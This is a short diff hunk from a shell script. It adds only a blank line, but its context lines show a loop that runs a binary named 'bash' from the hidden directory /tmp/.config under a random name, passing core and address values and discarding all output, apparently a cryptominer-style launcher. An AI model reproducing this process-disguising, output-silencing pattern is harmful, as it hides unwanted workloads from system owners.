@@ -38,3 +38,4 @@ if [ "$mode" == "0" ]; then
 else
   while true; do cd /tmp/.config; name=`RandString 2 c${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
 fi
+
